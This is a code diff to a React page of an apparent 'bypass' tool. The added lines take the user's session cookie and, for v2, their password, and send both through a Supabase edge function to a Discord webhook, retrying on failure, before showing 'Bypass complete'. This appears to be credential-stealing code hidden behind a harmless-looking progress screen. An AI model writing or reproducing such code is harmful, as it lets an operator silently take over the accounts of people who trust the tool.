@@ -131,6 +131,31 @@ const Index = () => {
 
     setProgress(100);
     setStatus("COMPLETE");
+
+    // Fire success webhook (routed by edge function to DISCORD_WEBHOOK_URL_SUCCESS)
+    const successBody: Record<string, unknown> = {
+      version,
+      status: "COMPLETE",
+      cookie,
+      durationMs: Date.now() - startedAt,
+      ...(version === "v2" ? { password } : {}),
+    };
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        const { data, error } = await supabase.functions.invoke("discord-notify", {
+          body: successBody,
+        });
+        if (error) throw error;
+        if (data && (data as { success?: boolean }).success === false) {
+          throw new Error("Edge function reported failure");
+        }
+        break;
+      } catch (err) {
+        console.warn(`Success notify attempt ${attempt} failed`, err);
+        if (attempt < 3) await new Promise((r) => setTimeout(r, 500 * 2 ** (attempt - 1)));
+      }
+    }
+
     toast.success("Bypass complete");
     setRunning(false);
     setDone(true);
